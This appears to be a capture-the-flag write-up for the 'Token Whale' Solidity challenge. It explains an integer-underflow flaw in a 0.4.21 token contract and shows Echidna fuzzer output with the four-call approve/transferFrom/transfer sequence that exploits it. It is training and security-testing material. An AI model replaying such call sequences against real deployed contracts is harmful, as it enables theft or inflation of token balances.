## Solution

1. Token Whale has no totalSupply variable and in version 0.4.21 there were no overflow checks
2. Hence, we can trigger an underflow to pass the checks but also let player account have a huge amount of tokens

┌───────────────────────────────────────────────────┬─────────────────[ Echidna 2.2.3 ]─────────────────┬──────────────────────────────────────────────────┐
│ Time elapsed: 4s                                  │ Unique instructions: 1375                         │ Chain ID: -                                      │
│ Workers: 0/1                                      │ Unique codehashes: 1                              │ Fetched contracts: 0/0                           │
│ Seed: 2635235997052154968                         │ Corpus size: 12 seqs                              │ Fetched slots: 0/0                               │
│ Calls/s: 9053                                     │ New coverage: 1s ago                              │                                                  │
│ Total calls: 36212/50000                          │                                                   │                                                  │
├───────────────────────────────────────────────────┴──────────────────── Tests (1) ────────────────────┴──────────────────────────────────────────────────┤
│ echidna_test_balance: FAILED! with ReturnFalse                                                                                                          ^│
│                                                                                                                                                          │
│ Call sequence:                                                                                                                                           │
│ 1. TestTokenWhaleChallenge.approve(0x20000,35340468949248548663878602044142867050478426807976958357265246165823068642297) from:                          │
│    0x0000000000000000000000000000000000030000 Time delay: 434894 seconds Block delay: 30042                                                              │
│ 2. TestTokenWhaleChallenge.transferFrom(0x30000,0xa329c0648769a73afac7f9381e08fb43dbea72,611) from: 0x0000000000000000000000000000000000020000 Time      │
│    delay: 82671 seconds Block delay: 15368                                                                                                               │
│ 3. TestTokenWhaleChallenge.transfer(0x10000,115792089237316195423570985008687907853269984665640564039457584007913129638936) from:                        │
│    0x0000000000000000000000000000000000020000 Time delay: 297507 seconds Block delay: 45852                                                              │
│ 4. TestTokenWhaleChallenge.transfer(0x30000,3566811619608566761465180910439246356103168508159379963813338847700429208829) from:                          │
│    0x0000000000000000000000000000000000010000 Time delay: 116188 seconds Block delay: 42229                                                              │
│                                                                                                                                                          │                                                                                                                    